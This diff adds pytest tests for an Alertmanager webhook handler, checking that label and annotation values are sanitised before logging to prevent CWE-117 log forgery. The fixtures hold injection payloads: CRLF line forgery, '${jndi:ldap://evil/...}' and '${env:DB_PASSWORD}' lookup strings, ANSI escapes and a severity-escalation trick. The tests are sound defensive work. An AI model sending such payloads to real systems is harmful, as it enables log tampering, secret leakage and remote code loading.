@@ -288,6 +288,303 @@ class TestReceiveAlertmanagerWebhook:
         assert result.processed == 1
 
 
+class TestAlertmanagerLogSanitisation:
+    """Pins CWE-117 log forgery shut on POST /api/webhooks/alerts (UR-48).
+
+    Every value this route interpolates comes from an unconstrained
+    ``dict[str, str]`` (``AlertmanagerAlert.labels`` / ``.annotations``), and a
+    ``monitoring``-scoped key can post it, so each interpolated value must pass
+    through ``sanitize_log_value`` (CWE-117; the file's house pattern). The
+    per-message marker counts are what make each field's own sanitising
+    observable: sanitising one field and leaving another raw changes the count.
+    """
+
+    def _alert(
+        self,
+        status: AlertmanagerStatus,
+        labels: dict[str, str],
+        annotations: dict[str, str],
+    ) -> WebhookAlert:
+        return WebhookAlert(
+            status=status,
+            labels=labels,
+            annotations=annotations,
+            startsAt=datetime(2026, 1, 17, 12, 0, 0, tzinfo=UTC),
+            endsAt=None,
+            fingerprint="fp-sanitize",
+        )
+
+    def _payload(self, alert: WebhookAlert) -> AlertmanagerWebhookPayload:
+        return AlertmanagerWebhookPayload(
+            version="4",
+            groupKey='{}:{alertname="forged"}',
+            truncatedAlerts=0,
+            status=alert.status,
+            receiver="test-receiver",
+            groupLabels={},
+            commonLabels={},
+            commonAnnotations={},
+            externalURL="http://alertmanager:9093",
+            alerts=[alert],
+        )
+
+    def _logged(self, mock_logger: MagicMock) -> str:
+        """The single log message this handler emitted, as the logger saw it."""
+        assert mock_logger.error.call_count + mock_logger.warning.call_count == 1
+        call = mock_logger.error.call_args or mock_logger.warning.call_args
+        return call.args[0]
+
+    @pytest.mark.asyncio
+    async def test_firing_line_sanitizes_labels_and_annotations(self) -> None:
+        """A newline or ``${…}`` in any interpolated field cannot forge a line."""
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {
+                "alertname": "GpuMem${env:DB_PASSWORD}\r\nFORGED-ALERT-LINE",
+                "severity": "critical",
+                "component": "gpu${jndi:ldap://evil/x}\rc2",
+            },
+            {"description": "above 90%\nfor 5 minutes${lower:pwn}"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        message = self._logged(mock_logger)
+        # CWE-117: the forged second line cannot survive into the logged message.
+        assert "\n" not in message
+        assert "\r" not in message
+        assert "${" not in message
+        # One marker per sanitised field (alertname, component, description), so a
+        # cure that wraps only some of them cannot pass.
+        assert message.count("[EXPRESSION_REMOVED]") == 3
+        # The alert is still identifiable: sanitising is not redacting.
+        assert "FORGED-ALERT-LINE" in message
+        assert message.startswith("[ALERT FIRING] ")
+
+    @pytest.mark.asyncio
+    async def test_firing_line_sanitizes_the_severity_field(self) -> None:
+        """``severity`` is interpolated too, so it is sanitised too.
+
+        Its raw value still chooses the level: this payload is not ``critical``
+        verbatim, so it lands at INFO. The cure sanitises log *content*, not
+        routing — routing on the sanitised value would escalate a crafted
+        ``critical\\x1b[0m`` to ERROR, a second behaviour change this defect
+        did not ask for. Pinned by the ESC absence, not a marker count:
+        ``sanitize_log_value`` deletes ANSI sequences rather than marking them.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {
+                "alertname": "GpuMem",
+                "severity": "critical\u001b[31m\nFORGED",
+                "component": "gpu",
+            },
+            {"description": "plain description"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        mock_logger.error.assert_not_called()
+        assert mock_logger.info.call_count == 1
+        message = mock_logger.info.call_args.args[0]
+        assert "\n" not in message
+        assert "\x1b" not in message
+        assert "(critical FORGED)" in message
+
+    @pytest.mark.asyncio
+    async def test_routing_reads_the_raw_severity_not_the_sanitized_one(self) -> None:
+        """Level selection must keep reading the raw ``severity``.
+
+        ``sanitize_log_value`` deletes ANSI sequences, so it can *manufacture*
+        the routing keyword: a crafted ``crit\\x1b[0mical`` sanitises to exactly
+        ``"critical"`` (measured: ``sanitize_log_value('crit\\x1b[0mical') ==
+        'critical'``). If level selection ever moved onto the sanitised value,
+        this payload would escalate itself to ERROR. It must not, so this asserts
+        ERROR was *not* taken - the only shape where raw and sanitised routing
+        disagree, which is what makes it a pin rather than a restatement.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {
+                "alertname": "GpuMem",
+                "severity": "crit\x1b[0mical",
+                "component": "gpu",
+            },
+            {"description": "GPU memory usage is above 90%"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        mock_logger.error.assert_not_called()
+        assert mock_logger.info.call_count == 1
+        # The ESC is gone from the text that was logged, ...
+        message = mock_logger.info.call_args.args[0]
+        assert "\x1b" not in message
+        # ... and what remains happens to read as "critical".
+        assert "(critical)" in message
+
+    @pytest.mark.asyncio
+    async def test_resolved_line_sanitizes_every_interpolated_field(self) -> None:
+        """The RESOLVED branch interpolates the same fields and is open too."""
+        alert = self._alert(
+            AlertmanagerStatus.RESOLVED,
+            {
+                "alertname": "GpuMem${env:KEY}\rforged",
+                "severity": "warning\u001b[0m\nforged",
+                "component": "gpu\x00${jndi:ldap://evil/y}",
+            },
+            {"description": "unused for this branch"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        assert mock_logger.info.call_count == 1
+        message = mock_logger.info.call_args.args[0]
+        assert "\n" not in message
+        assert "\r" not in message
+        assert "\x00" not in message
+        assert "\x1b" not in message
+        assert "${" not in message
+        # Two markers: one in ``alertname``, one in ``component``. ``severity``
+        # carries only an ANSI sequence, which the wrapper deletes rather than
+        # marks, and ``description`` is not interpolated on this branch.
+        assert message.count("[EXPRESSION_REMOVED]") == 2
+        # startsAt is a parsed datetime, so it needs no sanitising. That it still
+        # SHOWS is not observable here -- this counts markers, and deleting the
+        # field changes none of them -- so test_resolved_line_text_is_unchanged
+        # pins the whole line as exact text.
+        assert "resolved after firing since" in message
+
+    @pytest.mark.asyncio
+    async def test_well_formed_payload_message_text_is_unchanged(self) -> None:
+        """Done-when 2: for a value that needs no sanitising, the line is identical.
+
+        Pinned as exact text, not "contains", so the cure cannot quietly
+        re-quote, re-order or drop a field.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {"alertname": "HSIGPUMemoryHigh", "severity": "warning", "component": "gpu"},
+            {"description": "GPU memory usage is above 90% for 5 minutes"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        mock_logger.warning.assert_called_once_with(
+            "[ALERT FIRING] HSIGPUMemoryHigh (warning) - component=gpu: "
+            "GPU memory usage is above 90% for 5 minutes"
+        )
+
+    @pytest.mark.asyncio
+    async def test_summary_is_still_the_fallback_when_description_is_absent(self) -> None:
+        """The ``description`` -> ``summary`` fallback is pre-existing behaviour.
+
+        Alertmanager sends one, the other, or both; the handler prefers
+        ``description`` and falls back to ``summary``. The sanitising cure must
+        not disturb that choice, and nothing else here observes it - a cure that
+        dropped the fallback would log an empty message for every summary-only
+        alert and keep every other test green.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {"alertname": "HSIGPUMemoryHigh", "severity": "warning", "component": "gpu"},
+            {"summary": "GPU memory usage is high"},  # no description key
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        mock_logger.warning.assert_called_once_with(
+            "[ALERT FIRING] HSIGPUMemoryHigh (warning) - component=gpu: GPU memory usage is high"
+        )
+
+    @pytest.mark.asyncio
+    async def test_resolved_line_text_is_unchanged(self) -> None:
+        """Done-when 2 on the RESOLVED branch: the line is identical, pinned as exact text.
+
+        The FIRING branch above is pinned to the character; this branch was only
+        pinned by "contains", which cannot see a dropped field -- ``startsAt``
+        interpolated nothing caller-controlled, so the sanitising tests passed
+        while the line silently lost its timestamp. The two marker-count tests
+        cannot see it either: they count markers, and deleting a field changes
+        none of them.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.RESOLVED,
+            {"alertname": "HSIGPUMemoryHigh", "severity": "warning", "component": "gpu"},
+            {"description": "GPU memory usage is back below 90%"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        # ``_alert`` fixes startsAt at 2026-01-17 12:00 UTC; the handler renders the
+        # parsed datetime with f-string default formatting, not ISO 8601.
+        mock_logger.info.assert_called_once_with(
+            "[ALERT RESOLVED] HSIGPUMemoryHigh (warning) - component=gpu: "
+            "resolved after firing since 2026-01-17 12:00:00+00:00"
+        )
+
+    @pytest.mark.asyncio
+    async def test_high_severity_firing_alert_logs_warning(self) -> None:
+        """``severity="high"`` logs at WARNING, the arm docs/developer/api/webhooks.md documents.
+
+        Pre-existing routing, untouched by the cure -- but it sat in the middle of
+        the ``severity`` line this PR rewrites, and nothing pinned it: narrowing
+        the ``("warning", "high")`` arm to ``("warning",)`` kept every test green.
+        """
+        alert = self._alert(
+            AlertmanagerStatus.FIRING,
+            {"alertname": "HSIGPUMemoryHigh", "severity": "high", "component": "gpu"},
+            {"description": "GPU memory usage is above 90% for 5 minutes"},
+        )
+
+        with (
+            patch("backend.api.routes.webhooks.EventBroadcaster", autospec=True),
+            patch("backend.api.routes.webhooks.logger", autospec=True) as mock_logger,
+        ):
+            result = await receive_alertmanager_webhook(self._payload(alert), BackgroundTasks())
+
+        assert result.status == "ok"
+        mock_logger.warning.assert_called_once_with(
+            "[ALERT FIRING] HSIGPUMemoryHigh (high) - component=gpu: "
+            "GPU memory usage is above 90% for 5 minutes"
+        )
+
+
 class TestAlertmanagerSchemas:
     """Tests for Alertmanager webhook Pydantic schemas."""
 
